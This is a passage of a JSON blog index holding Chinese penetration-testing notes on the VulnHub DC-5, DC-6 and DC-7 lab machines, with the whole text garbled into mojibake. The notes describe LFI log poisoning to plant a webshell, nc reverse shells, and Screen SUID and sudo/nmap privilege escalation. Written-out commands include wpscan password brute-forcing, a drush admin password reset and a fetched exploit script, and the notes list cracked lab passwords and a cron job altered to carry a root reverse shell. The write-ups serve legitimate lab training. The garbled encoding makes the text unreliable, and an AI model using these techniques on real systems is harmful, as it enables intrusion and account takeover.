æ¥ä¸‹æ¥çœ‹çœ‹webæœåŠ¡ï¼š\nå¹¶ä¸æ˜¯ä»€ä¹ˆé€šç”¨çš„cmsï¼Œé‚£ä¹ˆå°±åªæœ‰å…ˆå°è¯•ä»åŠŸèƒ½ç‚¹å…¥æ‰‹äº†ï¼Œç¿»ä¸€ç¿»è¿™é‡Œæœ‰å“ªäº›åŠŸèƒ½\næˆ‘ä»¬å‘ç°contactåŠŸèƒ½ç‚¹æœ‰ç•™è¨€åŠŸèƒ½ï¼Œå†™ç‚¹ä¸œè¥¿è¯•è¯•\næäº¤åå‘ç°è·³è½¬äº†ï¼Œå¹¶ä¸”ç½‘é¡µåº•éƒ¨çš„Copyrightå€¼ä»2019å˜æˆäº†2017\nè”æƒ³åˆ°æˆ‘ä»¬åœ¨ç”¨dirsearchçš„æ—¶å€™ï¼Œæ‰«æåˆ°ä¸€ä¸ªfooter.phpï¼Œçœ‹åå­—åº”è¯¥ä¹Ÿæ˜¯ä¸€ä¸ªå…³äºç½‘é¡µåº•éƒ¨å†…å®¹çš„æ–‡ä»¶ï¼Œè®¿é—®è¯•è¯•ï¼š\nè¿˜çœŸæ˜¯ï¼Œè€Œä¸”å¦‚æœæˆ‘ä»¬åˆ·æ–°ï¼Œå¹´ä»½è¿˜ä¼šæœ‰å˜åŒ–ï¼š\nå¦‚æœæœ‰æ­å»ºåšå®¢ç»å†çš„è¯ï¼Œå…¶å®å°±èƒ½æƒ³åˆ°ï¼Œè¿™ä¸ªfooter.phpåº”è¯¥æ˜¯è¢«åŒ…å«åœ¨äº†thankyou.phpé‡Œçš„ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä»¥æ­¤ä¸ºç«‹è¶³ç‚¹å±•å¼€åˆ©ç”¨\næ¼æ´åˆ©ç”¨ æ–‡ä»¶åŒ…å«æ¼æ´ å¦‚æœè¿™é‡Œå­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨fuzzä¸€ä¸‹å¯èƒ½ç”¨äºåŒ…å«çš„å‚æ•°\nå…ˆè¯•è¯•getæ–¹æ³•ï¼š\nfuzzä¸€æ‰‹å‘ç°å‚æ•°ä¸ºfile\nå†éªŒè¯ä¸€ä¸‹ï¼ŒåŒ…å«/etc/passwdè¯•è¯•ï¼š\nç¡®å®æ˜¯æ–‡ä»¶åŒ…å«ï¼Œé‚£ä¹ˆè¿™é‡Œæƒ³è¦getshellå°±æœ‰ä¸¤ç§æ€è·¯ï¼š\næ‰“php_filter_chainï¼Œä½†æ˜¯filteré“¾å¾ˆé•¿ï¼Œä¼šè¢«GETä¼ å‚é™åˆ¶ï¼Œæ‰€ä»¥åªèƒ½æ‰§è¡Œç®€å•å‘½ä»¤ï¼Œä½†ç¡®å®å¯ä»¥å®ç°RCEï¼š\nåŒ…å«æ—¥å¿—æ–‡ä»¶å†™é©¬ï¼Œåªè¦çŸ¥é“æ—¥å¿—æ–‡ä»¶è·¯å¾„å°±èƒ½å†™ï¼Œè€Œæˆ‘ä»¬å·²çŸ¥ä¸­é—´ä»¶ä¸ºNginxï¼Œè·¯å¾„é€šå¸¸ä¸º/var/log/nginx/access.logï¼Œå¯ä»¥å°è¯•ä¸€æ‰‹\nåŒ…å«æ—¥å¿—æ–‡ä»¶å†™é©¬ okç›´æ¥æŠ“åŒ…å†™ä¸€ä¸ªphpinfoè¯•è¯•ï¼š\nåŒ…å«æ—¥å¿—æ–‡ä»¶çœ‹çœ‹ï¼š\nå‡ºç°äº†phpinfoç•Œé¢ï¼ŒæˆåŠŸ\næ¥ä¸‹æ¥å¯ä»¥å†™ä¸ªä¸€å¥è¯æœ¨é©¬ï¼š\nèšå‰‘è¿æ¥è¯•è¯•ï¼š\nè¿ä¸Šäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯åå¼¹shelläº†\nè·å–äº¤äº’å¼shell ncåå¼¹shell\næˆåŠŸè¿ä¸Šäº†\nä¾ç„¶æ˜¯pythonè·å–ptyï¼š æˆ‘ä»¬å½“å‰çš„æƒé™æ˜¯www-dataï¼Œæ¥ä¸‹æ¥åˆæ˜¯æƒé™æå‡äº†\næƒé™æå‡ å…ˆçœ‹çœ‹SUIDæƒé™çš„æ–‡ä»¶æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„\nè¿˜çœŸæœ‰ä¸€ä¸ªScreen 4.5.0çš„æ¼æ´å¯ç”¨äºæƒé™æå‡\nå°†è„šæœ¬å¤åˆ¶ä¸€ä»½æ”¾åˆ°webç›®å½•ï¼š\nçœ‹çœ‹è„šæœ¬å†…å®¹ï¼š\nå¦‚å›¾ï¼Œè„šæœ¬å†…å®¹åˆ†ä¸‰æ®µï¼Œå‰ä¸¤æ®µä¼šæ„é€ å‡ºå•ç‹¬çš„è„šæœ¬æ–‡ä»¶ï¼Œè¿˜æœ‰ä¸€æ®µä¼šæ‰§è¡Œåˆ©ç”¨å‘½ä»¤\næ¥ä¸‹æ¥æ‰“å¼€httpæœåŠ¡å‡†å¤‡ä¸Šä¼ æ–‡ä»¶ï¼š\npython2 -m SimpleHTTPServer 8000 åœ¨é¶æœºä¸Šä½¿ç”¨wgetä¸‹è½½è„šæœ¬æ–‡ä»¶åˆ°/tmp/ç›®å½•ï¼Œå†èµ‹äºˆæ‰§è¡Œæƒé™ï¼Œå³å¯è¿è¡Œææƒè„šæœ¬ï¼š\nå¦‚å›¾ï¼ŒææƒæˆåŠŸï¼Œez\næ¥ä¸‹æ¥åœ¨/rootç›®å½•æ‹¿åˆ°flagï¼š\næ€»ç»“ æœ¬æ¬¡æ¸—é€è¿‡ç¨‹ä¸­ï¼Œæœ‰å¦‚ä¸‹æ¼æ´æˆ–åˆ©ç”¨ï¼š\nwebç½‘é¡µæ–‡ä»¶åŒ…å«å‚æ•°å¯æ§ åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼ŒåŒ…å«æ—¥å¿—æ–‡ä»¶å†™é©¬ getshellååˆ©ç”¨screençš„ç‰ˆæœ¬æ¼æ´å®ç°suidææƒ ",
        "summary": "DC-5æ¸—é€ç¬”è®° ä¿¡æ¯æœé›† ç»è¿‡å‰é¢å‡ ä¸ªé¶æœºçš„ç»ƒä¹ ï¼Œå·²ç»è½»è½¦ç†Ÿè·¯äº†ï¼š\nä¿¡æ¯æœé›†ä¸€æ¡é¾™ï¼Œå¯çŸ¥ï¼š\nIPä¸º192.168.111.145 å¼€æ”¾äº†80ã€111ã€47890ä¸‰ä¸ªç«¯å£ ç›®å½•æ‰«æåˆ°ä¸€ç‚¹ç‚¹å¯è®¿é—®è·¯å¾„ æ¥ä¸‹æ¥çœ‹çœ‹webæœåŠ¡ï¼š\nå¹¶ä¸æ˜¯ä»€ä¹ˆé€šç”¨çš„cmsï¼Œé‚£ä¹ˆå°±åªæœ‰å…ˆå°è¯•ä»åŠŸèƒ½ç‚¹å…¥æ‰‹äº†ï¼Œç¿»ä¸€ç¿»è¿™é‡Œæœ‰å“ªäº›åŠŸèƒ½\næˆ‘ä»¬å‘ç°contactåŠŸèƒ½ç‚¹æœ‰ç•™è¨€åŠŸèƒ½ï¼Œå†™ç‚¹ä¸œè¥¿è¯•è¯•\næäº¤åå‘ç°è·³è½¬äº†ï¼Œå¹¶ä¸”ç½‘é¡µåº•éƒ¨çš„Copyrightå€¼ä»2019å˜æˆäº†2017\nè”æƒ³åˆ°æˆ‘ä»¬åœ¨ç”¨dirsearchçš„æ—¶å€™ï¼Œæ‰«æåˆ°ä¸€ä¸ªfooter.phpï¼Œçœ‹åå­—åº”è¯¥ä¹Ÿæ˜¯ä¸€ä¸ªå…³äºç½‘é¡µåº•éƒ¨å†…å®¹çš„æ–‡ä»¶ï¼Œè®¿é—®è¯•è¯•ï¼š\nè¿˜çœŸæ˜¯ï¼Œè€Œä¸”å¦‚æœæˆ‘ä»¬åˆ·æ–°ï¼Œå¹´ä»½è¿˜ä¼šæœ‰å˜åŒ–ï¼š\nå¦‚æœæœ‰æ­å»ºåšå®¢ç»å†çš„è¯ï¼Œå…¶å®å°±èƒ½æƒ³åˆ°ï¼Œè¿™ä¸ªfooter.phpåº”è¯¥æ˜¯è¢«åŒ…å«åœ¨äº†thankyou.phpé‡Œçš„ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä»¥æ­¤ä¸ºç«‹è¶³ç‚¹å±•å¼€åˆ©ç”¨\næ¼æ´åˆ©ç”¨ æ–‡ä»¶åŒ…å«æ¼æ´ å¦‚æœè¿™é‡Œå­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨fuzzä¸€ä¸‹å¯èƒ½ç”¨äºåŒ…å«çš„å‚æ•°\nå…ˆè¯•è¯•getæ–¹æ³•ï¼š\nfuzzä¸€æ‰‹å‘ç°å‚æ•°ä¸ºfile\nå†éªŒè¯ä¸€ä¸‹ï¼ŒåŒ…å«/etc/passwdè¯•è¯•ï¼š\nç¡®å®æ˜¯æ–‡ä»¶åŒ…å«ï¼Œé‚£ä¹ˆè¿™é‡Œæƒ³è¦getshellå°±æœ‰ä¸¤ç§æ€è·¯ï¼š\næ‰“php_filter_chainï¼Œä½†æ˜¯filteré“¾å¾ˆé•¿ï¼Œä¼šè¢«GETä¼ å‚é™åˆ¶ï¼Œæ‰€ä»¥åªèƒ½æ‰§è¡Œç®€å•å‘½ä»¤ï¼Œä½†ç¡®å®å¯ä»¥å®ç°RCEï¼š\nåŒ…å«æ—¥å¿—æ–‡ä»¶å†™é©¬ï¼Œåªè¦çŸ¥é“æ—¥å¿—æ–‡ä»¶è·¯å¾„å°±èƒ½å†™ï¼Œè€Œæˆ‘ä»¬å·²çŸ¥ä¸­é—´ä»¶ä¸ºNginxï¼Œè·¯å¾„é€šå¸¸ä¸º/var/log/nginx/access.logï¼Œå¯ä»¥å°è¯•ä¸€æ‰‹\nåŒ…å«æ—¥å¿—æ–‡ä»¶å†™é©¬ okç›´æ¥æŠ“åŒ…å†™ä¸€ä¸ªphpinfoè¯•è¯•ï¼š\nåŒ…å«æ—¥å¿—æ–‡ä»¶çœ‹çœ‹ï¼š\nå‡ºç°äº†phpinfoç•Œé¢ï¼ŒæˆåŠŸ\næ¥ä¸‹æ¥å¯ä»¥å†™ä¸ªä¸€å¥è¯æœ¨é©¬ï¼š\nèšå‰‘è¿æ¥è¯•è¯•ï¼š\nè¿ä¸Šäº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯åå¼¹shelläº†\nè·å–äº¤äº’å¼shell ncåå¼¹shell\næˆåŠŸè¿ä¸Šäº†\nä¾ç„¶æ˜¯pythonè·å–ptyï¼š æˆ‘ä»¬å½“å‰çš„æƒé™æ˜¯www-dataï¼Œæ¥ä¸‹æ¥åˆæ˜¯æƒé™æå‡äº†\næƒé™æå‡ å…ˆçœ‹çœ‹SUIDæƒé™çš„æ–‡ä»¶æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„\nè¿˜çœŸæœ‰ä¸€ä¸ªScreen 4.5.0çš„æ¼æ´å¯ç”¨äºæƒé™æå‡\nå°†è„šæœ¬å¤åˆ¶ä¸€ä»½æ”¾åˆ°webç›®å½•ï¼š\nçœ‹çœ‹è„šæœ¬å†…å®¹ï¼š\nå¦‚å›¾ï¼Œè„šæœ¬å†…å®¹åˆ†ä¸‰æ®µï¼Œå‰ä¸¤æ®µä¼šæ„é€ å‡ºå•ç‹¬çš„è„šæœ¬æ–‡ä»¶ï¼Œè¿˜æœ‰ä¸€æ®µä¼šæ‰§è¡Œåˆ©ç”¨å‘½ä»¤\næ¥ä¸‹æ¥æ‰“å¼€httpæœåŠ¡å‡†å¤‡ä¸Šä¼ æ–‡ä»¶ï¼š\npython2 -m SimpleHTTPServer 8000 åœ¨é¶æœºä¸Šä½¿ç”¨wgetä¸‹è½½è„šæœ¬æ–‡ä»¶åˆ°/tmp/ç›®å½•ï¼Œå†èµ‹äºˆæ‰§è¡Œæƒé™ï¼Œå³å¯è¿è¡Œææƒè„šæœ¬ï¼š\n"
    }
,
    {
        "title": "DC-6æ¸—é€ç¬”è®°",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-6%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/",
        "content": "DC-6æ¸—é€ç¬”è®° é¶æœºç»™äº†ä¸¤ä¸ªæç¤ºï¼Œä¸€ä¸ªæ˜¯æ’ä»¶ï¼Œä¸€ä¸ªæ˜¯æš´åŠ›ç ´è§£\nä¿¡æ¯æ”¶é›† IPæ¢æµ‹ IPä¸º192.168.111.142\nç«¯å£æ¢æµ‹ å¯çŸ¥å¼€æ”¾äº†22ç«¯å£å’Œ80ç«¯å£\nç½‘é¡µä¿¡æ¯æœé›† è®¿é—®ç½‘é¡µå‘ç°æ— æ³•è®¿é—®\nå‘ç°urlè¢«è§£ææˆwordyï¼Œå’ŒDC-2ç±»ä¼¼ï¼Œåœ¨hostsæ–‡ä»¶æ·»åŠ è§£æå†æ¬¡è®¿é—®\nä¸»è¦ä¿¡æ¯å°±æ˜¯CMSä¸ºwordpress 5.1.1\nå…ˆæ‰«ä¸€ä¸‹ç›®å½•ï¼š\nå¯ä»¥æ‰¾åˆ°åå°ç™»é™†ç‚¹\næ¼æ´åˆ©ç”¨ æš´åŠ›ç ´è§£ç™»é™†åå° æ ¹æ®æç¤ºå¯ä»¥æƒ³åˆ°è¿™é‡Œåº”è¯¥æ˜¯è¦æš´åŠ›ç ´è§£ä¸€ä¸‹åå°å¯†ç \nå…ˆç”¨wpscanæ‰«æ‰«\nwpscan --url http://wordy --enumerate u æšä¸¾å‡ºå‡ ä¸ªç”¨æˆ·ï¼Œå…ˆä¿å­˜åœ¨æ–‡ä»¶é‡Œ\næˆ‘ä»¬ç›´æ¥ç”¨rockyou.txtçˆ†ç ´ä¸€ä¸‹ï¼š\nwpscan --url http://wordy -P /usr/share/wordlists/rockyou.txt -U wpname.txt å­—å…¸å¾ˆå¤§ï¼Œè€å¿ƒç­‰å¾…\næœ€åå¾—åˆ°markçš„å¯†ç ï¼šhelpdesk01\nå³å¯ç™»å½•è¿›å…¥åå°\nåå°getshell åå°å‘ç°è¿™ä¸ªæ’ä»¶ä¼¼ä¹ä½¿ç”¨å‘½ä»¤æ‰§è¡Œï¼ŒlookupæŠ“åŒ…çœ‹çœ‹ï¼š\nè¿˜çœŸæ˜¯ï¼Œé‚£å°±ç›´æ¥åå¼¹shellï¼š\nokå·²ç»getshellï¼Œå†æ‹¿ä¸ªptyï¼š\næ¥ä¸‹æ¥å°±æ˜¯ææƒäº†\næƒé™æå‡ åœ¨stuffç›®å½•ä¸‹æ‰¾åˆ°äº†ä¸€ä¸ªä»»åŠ¡æ¸…å•ï¼š\nå‘ç°äº†grahamçš„å¯†ç ï¼šGSo7isUM1D4\nç›´æ¥ç™»å½•ï¼š\nçœ‹çœ‹sudoæƒé™ï¼š\nå‘ç°ä¸€ä¸ªå…å¯†sudoï¼ˆèº«ä»½ä¸ºjensï¼‰çš„è„šæœ¬ï¼Œçœ‹çœ‹å†…å®¹å’Œæƒé™ï¼š jensç”¨æˆ·å¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œå¾ˆæ˜æ˜¾çš„sudoè„šæœ¬ç¯¡æ”¹ææƒï¼Œç›´æ¥è¿½åŠ å†™å…¥å†…å®¹ï¼Œå†ä»¥jensç”¨æˆ·æ‰§è¡Œï¼Œå¯ä»¥æ‹¿åˆ°jensèº«ä»½çš„bashï¼ˆè¿™é‡Œå°è¯•çš„æ—¶å€™ï¼Œæç¤ºæƒé™ä¸è¶³ï¼Œåº”è¯¥æ˜¯åˆ‡æ¢ç”¨æˆ·æ—¶çš„é—®é¢˜ï¼Œäºæ˜¯æ¢æˆä½¿ç”¨sshç™»å½•grahamç”¨æˆ·ï¼‰ï¼š\nå†çœ‹çœ‹jensçš„sudoæƒé™ï¼š\nå‘ç°nmapå¯ä»¥å…å¯†sudoæ‰§è¡Œï¼Œè€Œnmapå¯ä»¥æ‰§è¡Œè„šæœ¬æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥å®ç°æƒé™æå‡ï¼š\næˆåŠŸæ‹¿åˆ°rootæƒé™\nåœ¨/rootç›®å½•æ‹¿åˆ°flagï¼š\n",
        "summary": "DC-6æ¸—é€ç¬”è®° é¶æœºç»™äº†ä¸¤ä¸ªæç¤ºï¼Œä¸€ä¸ªæ˜¯æ’ä»¶ï¼Œä¸€ä¸ªæ˜¯æš´åŠ›ç ´è§£\nä¿¡æ¯æ”¶é›† IPæ¢æµ‹ IPä¸º192.168.111.142\nç«¯å£æ¢æµ‹ å¯çŸ¥å¼€æ”¾äº†22ç«¯å£å’Œ80ç«¯å£\nç½‘é¡µä¿¡æ¯æœé›† è®¿é—®ç½‘é¡µå‘ç°æ— æ³•è®¿é—®\nå‘ç°urlè¢«è§£ææˆwordyï¼Œå’ŒDC-2ç±»ä¼¼ï¼Œåœ¨hostsæ–‡ä»¶æ·»åŠ è§£æå†æ¬¡è®¿é—®\nä¸»è¦ä¿¡æ¯å°±æ˜¯CMSä¸ºwordpress 5.1.1\nå…ˆæ‰«ä¸€ä¸‹ç›®å½•ï¼š\nå¯ä»¥æ‰¾åˆ°åå°ç™»é™†ç‚¹\næ¼æ´åˆ©ç”¨ æš´åŠ›ç ´è§£ç™»é™†åå° æ ¹æ®æç¤ºå¯ä»¥æƒ³åˆ°è¿™é‡Œåº”è¯¥æ˜¯è¦æš´åŠ›ç ´è§£ä¸€ä¸‹åå°å¯†ç \nå…ˆç”¨wpscanæ‰«æ‰«\nwpscan --url http://wordy --enumerate u æšä¸¾å‡ºå‡ ä¸ªç”¨æˆ·ï¼Œå…ˆä¿å­˜åœ¨æ–‡ä»¶é‡Œ\næˆ‘ä»¬ç›´æ¥ç”¨rockyou.txtçˆ†ç ´ä¸€ä¸‹ï¼š\nwpscan --url http://wordy -P /usr/share/wordlists/rockyou.txt -U wpname.txt å­—å…¸å¾ˆå¤§ï¼Œè€å¿ƒç­‰å¾…\næœ€åå¾—åˆ°markçš„å¯†ç ï¼šhelpdesk01\nå³å¯ç™»å½•è¿›å…¥åå°\nåå°getshell åå°å‘ç°è¿™ä¸ªæ’ä»¶ä¼¼ä¹ä½¿ç”¨å‘½ä»¤æ‰§è¡Œï¼ŒlookupæŠ“åŒ…çœ‹çœ‹ï¼š\nè¿˜çœŸæ˜¯ï¼Œé‚£å°±ç›´æ¥åå¼¹shellï¼š\nokå·²ç»getshellï¼Œå†æ‹¿ä¸ªptyï¼š\næ¥ä¸‹æ¥å°±æ˜¯ææƒäº†\næƒé™æå‡ åœ¨stuffç›®å½•ä¸‹æ‰¾åˆ°äº†ä¸€ä¸ªä»»åŠ¡æ¸…å•ï¼š\nå‘ç°äº†grahamçš„å¯†ç ï¼šGSo7isUM1D4\nç›´æ¥ç™»å½•ï¼š\nçœ‹çœ‹sudoæƒé™ï¼š\nå‘ç°ä¸€ä¸ªå…å¯†sudoï¼ˆèº«ä»½ä¸ºjensï¼‰çš„è„šæœ¬ï¼Œçœ‹çœ‹å†…å®¹å’Œæƒé™ï¼š jensç”¨æˆ·å¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œå¾ˆæ˜æ˜¾çš„sudoè„šæœ¬ç¯¡æ”¹ææƒï¼Œç›´æ¥è¿½åŠ å†™å…¥å†…å®¹ï¼Œå†ä»¥jensç”¨æˆ·æ‰§è¡Œï¼Œå¯ä»¥æ‹¿åˆ°jensèº«ä»½çš„bashï¼ˆè¿™é‡Œå°è¯•çš„æ—¶å€™ï¼Œæç¤ºæƒé™ä¸è¶³ï¼Œåº”è¯¥æ˜¯åˆ‡æ¢ç”¨æˆ·æ—¶çš„é—®é¢˜ï¼Œäºæ˜¯æ¢æˆä½¿ç”¨sshç™»å½•grahamç”¨æˆ·ï¼‰ï¼š\nå†çœ‹çœ‹jensçš„sudoæƒé™ï¼š\nå‘ç°nmapå¯ä»¥å…å¯†sudoæ‰§è¡Œï¼Œè€Œnmapå¯ä»¥æ‰§è¡Œè„šæœ¬æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥å®ç°æƒé™æå‡ï¼š\næˆåŠŸæ‹¿åˆ°rootæƒé™\nåœ¨/rootç›®å½•æ‹¿åˆ°flagï¼š\n"
    }
,
    {
        "title": "DC-7æ¸—é€ç¬”è®°",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/vulnhub/dc/dc-7%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/",
        "content": "DC-7æ¸—é€ç¬”è®° é¶åœºä½œè€…è¯´æ˜ï¼š\nä¿¡æ¯æœé›† IPã€ç«¯å£ã€ç›®å½•ä¸€æ¡é¾™ï¼š\nå¯çŸ¥ï¼š\nIPä¸º192.168.111.145 å¼€æ”¾22ã€80ç«¯å£ ç›®å½•æ¯›éƒ½æ²¡æ‰«å‡º çœ‹çœ‹webç½‘é¡µï¼š\nå¯çŸ¥cmsæ˜¯Drupal 8\næ¼æ´åˆ©ç”¨ æ•æ„Ÿä¿¡æ¯æ³„éœ² åœ¨é¶åœºæè¿°é‡Œè¯´æŒ‘æˆ˜ä¸å®Œå…¨æ˜¯æŠ€æœ¯æ€§çš„ï¼Œè¦è·³å‡ºæ¡†æ¡†æ€è€ƒï¼Œè¯´æ˜çªç ´å£å¯èƒ½ä¸æ˜¯ç½‘ç«™æœ¬èº«ï¼Œæ‰¾æ‰¾çœ‹\nåœ¨é¡µè„šå‘ç°ä¸€ä¸ªå«@DC7USERçš„ç”¨æˆ·ï¼Œæœæœç»“æœå‘ç°äº†è¯¥ç”¨æˆ·çš„github\nçœ‹çœ‹ä»–å‘çš„ä»£ç ï¼š\nåœ¨config.phpé‡Œé¢å‘ç°äº†è´¦å¯†ï¼Œè¯•è¯•ç™»å½•drupalå‘¢\nåˆ©ç”¨è´¦å¯†è¿æ¥ssh é”™äº†ï¼Œé‚£è¿˜æœ‰ç™»é™†çš„åœ°æ–¹å°±æ˜¯22ç«¯å£çš„sshæœåŠ¡ï¼Œè¿æ¥è¯•è¯•ï¼š\nè¿™å°±getshelläº†ï¼Ÿ\nshellä¸‹çš„ä¿¡æ¯æœé›† æ­£å¸¸è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œçœ‹çœ‹suidã€sudoã€å†…æ ¸ç­‰ï¼š\nç¡®å®æ²¡æœ‰ä»€ä¹ˆåˆ©ç”¨ç‚¹ï¼Œé‚£å¯èƒ½å°±æ˜¯æœ‰ä»€ä¹ˆåˆ©ç”¨æ–‡ä»¶äº†ï¼Œæ‰¾æ‰¾çœ‹ï¼š\nå½“å‰ç›®å½•æœ‰å¤‡ä»½æ–‡ä»¶å¤¹ï¼Œä½†é‡Œé¢æ˜¯åŠ å¯†çš„gpgæ–‡ä»¶ï¼Œè€Œmboxè®°å½•äº†rootçš„å®šæ—¶ä»»åŠ¡ï¼Œè·¯å¾„ä¸º/opt/scripts/backups.shï¼Œè¿‡å»çœ‹çœ‹ï¼š\nåˆ©ç”¨è¿™ä¸ªrootçš„ä»»åŠ¡å¯ä»¥ææƒï¼Œä½†å‘ç°è„šæœ¬åªæœ‰rootå’Œwww-dataå¯å†™ï¼Œå¾—æƒ³åŠæ³•æ‹¿åˆ°www-dataèº«ä»½ï¼Œé‚£å°±å¾—é€šè¿‡webæœåŠ¡æ‹¿shellï¼Œé‚£ä¹ˆå…¥æ‰‹ç‚¹åˆè¦å›åˆ°åå°ï¼Œå…ˆçœ‹çœ‹è„šæœ¬\nè„šæœ¬å†…å®¹ï¼š\n#!/bin/bash # åˆ é™¤ /home/dc7user/backups/ ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ rm /home/dc7user/backups/* # åˆ‡æ¢ç›®å½•åˆ° /var/www/html/ cd /var/www/html/ # ä½¿ç”¨ Drush å·¥å…·å¯¼å‡ºæ•°æ®åº“ï¼Œå¹¶å°†ç»“æœä¿å­˜ä¸º /home/dc7user/backups/website.sql drush sql-dump --result-file=/home/dc7user/backups/website.sql # è¿”å›ä¸Šçº§ç›®å½• cd .. # å°† html/ ç›®å½•çš„å†…å®¹æ‰“åŒ…æˆ website.tar.gz å¹¶ä¿å­˜åœ¨ /home/dc7user/backups/ ç›®å½•ä¸‹ tar -czf /home/dc7user/backups/website.tar.gz html/ # ä½¿ç”¨ GPG å¯¹ /home/dc7user/backups/website.sql æ–‡ä»¶è¿›è¡Œå¯¹ç§°åŠ å¯†ï¼Œå¹¶ç”¨æŒ‡å®šçš„å¯†ç ä¿æŠ¤ gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql # ä½¿ç”¨ GPG å¯¹ /home/dc7user/backups/website.tar.gz æ–‡ä»¶è¿›è¡Œå¯¹ç§°åŠ å¯†ï¼Œå¹¶ç”¨æŒ‡å®šçš„å¯†ç ä¿æŠ¤ gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz # å°† /home/dc7user/backups/ ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„æ‰€æœ‰è€…æ”¹ä¸º dc7user chown dc7user:dc7user /home/dc7user/backups/* # åˆ é™¤ /home/dc7user/backups/website.sql æ–‡ä»¶ rm /home/dc7user/backups/website.sql # åˆ é™¤ /home/dc7user/backups/website.tar.gz æ–‡ä»¶ rm /home/dc7user/backups/website.tar.gz è¿™é‡Œé‡ç‚¹åœ¨äºdrushï¼Œæ˜¯ä¸€ä¸ªç®€åŒ–äº†åˆ›å»ºå’Œç®¡ç†Drupal8ç½‘ç«™çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥ç”¨æ¥ä¿®æ”¹å¯†ç ï¼š\ndrush upwd admin --password=\u0026#34;123456\u0026#34; é‡ç½®å¯†ç è¿›å…¥åå° æˆ‘ä»¬å»webç›®å½•å°è¯•ä¿®æ”¹ç½‘é¡µçš„adminå¯†ç ï¼š ä¿®æ”¹åå°è¯•ç™»å½•adminï¼š\nç™»å½•æˆåŠŸ\nåˆ°åå°çš„æ€è·¯åŸºæœ¬å°±æ˜¯æ‰¾å†™webshellçš„ç‚¹äº†ï¼Œå‘ç°åœ¨Content =\u0026gt; Add content =\u0026gt;Basic pageå¤„ä¼¼ä¹å¯ä»¥å†™ï¼š\nå‘ç°Drupal 8ä¸æ”¯æŒPHPä»£ç ï¼Œéœ€è¦å°†phpå•ç‹¬ä½œä¸ºä¸€ä¸ªæ¨¡å—å¯¼å…¥ï¼Œè¿›å…¥Extend =\u0026gt; Install new moduleï¼Œè¾“å…¥urlï¼šhttps://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz\nç„¶åinstallï¼Œå®‰è£…å®Œæ¯•å°±enableæ¿€æ´»ï¼Œå‹¾é€‰è¦æ¿€æ´»çš„æ¨¡å—ï¼š\nç„¶åå†installå³å¯å†™phpä»£ç äº†:\nä¿å­˜åçœ‹çœ‹è·¯å¾„ï¼š\nèšå‰‘è¿æ¥ï¼š\næ¥ä¸‹æ¥åå¼¹shell: è·å–ptyï¼š okæ­£å¼è¿›å…¥ææƒé˜¶æ®µ\næƒé™æå‡ ä¿®æ”¹æˆ‘ä»¬å…ˆå‰å‘ç°çš„å®šæ—¶ä»»åŠ¡è„šæœ¬ï¼Œå†™å…¥åå¼¹shellä»£ç ï¼Œå¼€å¯ç›‘å¬å¹¶ç­‰å¾…å®šæ—¶ä»»åŠ¡ä»¥rootèº«ä»½æ‰§è¡Œï¼š æˆåŠŸåå¼¹åˆ°rootçš„shellï¼š\nç„¶åæ‹¿flag:\næ”¶å·¥\næ€»ç»“ æœ¬æ¬¡æ¸—é€è¿‡ç¨‹çš„æ¼æ´æˆ–åˆ©ç”¨ï¼š\ngithubæºç æ³„éœ²sshè´¦å¯† é‚®ç®±æ³„éœ²å®šæ—¶ä»»åŠ¡è„šæœ¬ drushé‡ç½®drupalçš„ç®¡ç†å‘˜å¯†ç  åå°æ”¯æŒphpæ¨¡å—å¯¼è‡´å†™webshell å®šæ—¶ä»»åŠ¡è„šæœ¬å¯è¢«www-dataç¯¡æ”¹ å®šæ—¶ä»»åŠ¡è„šæœ¬ä»¥rootè¿è¡Œå®ç°ææƒ ",
        "summary": "DC-7æ¸—é€ç¬”è®° é¶åœºä½œè€…è¯´æ˜ï¼š\nä¿¡æ¯æœé›† IPã€ç«¯å£ã€ç›®å½•ä¸€æ¡é¾™ï¼š\nå¯çŸ¥ï¼š\nIPä¸º192.168.111.145 å¼€æ”¾22ã€80ç«¯å£ ç›®å½•æ¯›éƒ½æ²¡æ‰«å‡º çœ‹çœ‹webç½‘é¡µï¼š\nå¯çŸ¥cmsæ˜¯Drupal 8\næ¼æ´åˆ©ç”¨ æ•æ„Ÿä¿¡æ¯æ³„éœ² åœ¨é¶åœºæè¿°é‡Œè¯´æŒ‘æˆ˜ä¸å®Œå…¨æ˜¯æŠ€æœ¯æ€§çš„ï¼Œè¦è·³å‡ºæ¡†æ¡†æ€è€ƒï¼Œè¯´æ˜çªç ´å£å¯èƒ½ä¸æ˜¯ç½‘ç«™æœ¬èº«ï¼Œæ‰¾æ‰¾çœ‹\nåœ¨é¡µè„šå‘ç°ä¸€ä¸ªå«@DC7USERçš„ç”¨æˆ·ï¼Œæœæœç»“æœå‘ç°äº†è¯¥ç”¨æˆ·çš„github\nçœ‹çœ‹ä»–å‘çš„ä»£ç 